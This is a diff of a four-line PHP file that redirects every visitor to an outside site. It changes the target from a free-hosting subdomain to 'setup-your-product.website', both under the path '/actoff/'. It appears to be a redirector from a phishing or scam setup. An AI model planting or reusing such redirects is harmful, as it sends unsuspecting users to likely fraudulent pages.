@@ -1,4 +1,4 @@
 <?php
-header("Location: https://contortional-transm.000webhostapp.com/actoff/");
+header("Location: https://setup-your-product.website/actoff/");
 die();
 ?>
